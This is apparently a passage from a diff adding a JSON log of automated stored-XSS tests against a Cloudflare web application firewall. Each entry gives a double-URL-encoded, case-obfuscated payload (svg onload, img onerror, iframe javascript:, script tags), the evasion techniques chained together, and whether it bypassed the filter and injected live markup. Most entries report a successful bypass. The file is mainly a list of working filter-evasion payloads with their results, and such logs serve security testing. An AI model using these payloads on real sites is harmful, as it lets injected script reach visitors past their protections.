+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/oNlOad=aLeRt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"aLeRt(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIFRAME%2520SRC%253dJAVASCRIPT%253aALERT%25281%2529%253e",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRAME SRC=JAVASCRIPT:ALERT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JAVASCRIPT:ALERT(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Cimg/%252A%2521５０００0%252a/src%253Dx/%252A%2521５００００%252Ａ/onerror%25３Dalert%25２８１２６%25２９%25３E",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<img/*!500OO*/src=x/*!500OO*/onerror=alert(126)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img *!500oo*=\"\" src=\"x/*!500OO*/onerror=alert(126)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/onmouseover%253Dalert%25281790%2529%253E<img src%253Dx onerror%253Dalert%25284608%2529%253E",
+        "technique": "SVG onEvent_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onmouseover=alert(1790)><img src=x onerror=alert(4608)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseover=\"alert(1790)\"></svg>"
+                    },
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"x\" onerror=\"alert(4608)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CiMG%252509srC%253DX%252509oNERRoR%253DaLerT%25281%2529%253E",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<iMG\tsrC=X\toNERRoR=aLerT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIFRAME%2520SRC%253dJAVASCRIPT%253aALERT%25281%2529%253e",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IFRAME SRC=JAVASCRIPT:ALERT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "iframe",
+                        "html": "<iframe src=\"JAVASCRIPT:ALERT(1)\"></iframe>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%25253CscriPt%25253EalErT%2525281%252529%25253c/ScriPT%25253e",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<scriPt>alErT(1)</ScriPT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>alErT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cIMG%2520SRC%253dX%2520ONERROR%253dALERT%25281%2529%253e",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<IMG SRC=X ONERROR=ALERT(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [
+                    {
+                        "method": "GET",
+                        "headers": {
+                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                            "Referer": ""
+                        },
+                        "post_data": null
+                    }
+                ],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "img",
+                        "html": "<img src=\"X\" onerror=\"ALERT(1)\">"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%EF%BC%91%3Cimg/%250AonERROR%250D%250B%EF%BD%8F%EF%BD%8E%EF%BD%97erRor%3DALERT%28document.domain%29%250A%250A%250A",
+        "technique": "SVG onEvent_adv_obf_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "1<img/\nonERROR%OD%OBonwerRor=ALERT(document.domain)\n\n\n",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cbODy%2509ONload%253dALErT%25281%2529%253E",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "<bODy\tONload=ALErT(1)>",
+            "is_safe": true,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253CsVg/oNlOad%253dALERt%25281%2529%253e",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<sVg/oNlOad=ALERt(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onload=\"ALERt(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253Csvg/onmouseover%253Dalert%25281%2529%253E",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<svg/onmouseover=alert(1)>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "svg",
+                        "html": "<svg onmouseover=\"alert(1)\"></svg>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    },
+    {
+        "payload": "%253cScRIPT%253eAlERT%25281%2529%253C/SCRIpT%253E",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "waf": "Cloudflare",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "<ScRIPT>AlERT(1)</SCRIpT>",
+            "is_safe": false,
+            "harms": {
+                "sent_requests": [],
+                "unexpected_nodes": [
+                    {
+                        "tag_name": "script",
+                        "html": "<script>AlERT(1)</script>"
+                    }
+                ],
+                "redirect_url": null
+            }
+        }
+    }
+]
